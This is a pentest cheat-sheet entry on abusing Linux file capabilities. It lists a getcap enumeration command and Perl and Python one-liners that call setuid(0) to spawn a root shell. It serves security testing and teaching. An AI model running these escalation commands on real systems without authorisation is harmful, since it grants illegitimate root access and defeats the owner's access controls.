---
title: Linux Capabilities Abuse
category: privesc
subcategory: linux-privesc
os: linux
command: getcap -r / 2>/dev/null
tools: getcap, perl, python
---


### Find capabilities

```bash
getcap -r / 2>/dev/null
```

### Perl with cap_setuid+ep

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

### Python with cap_setuid+ep

```bash
python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### Reference

https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities
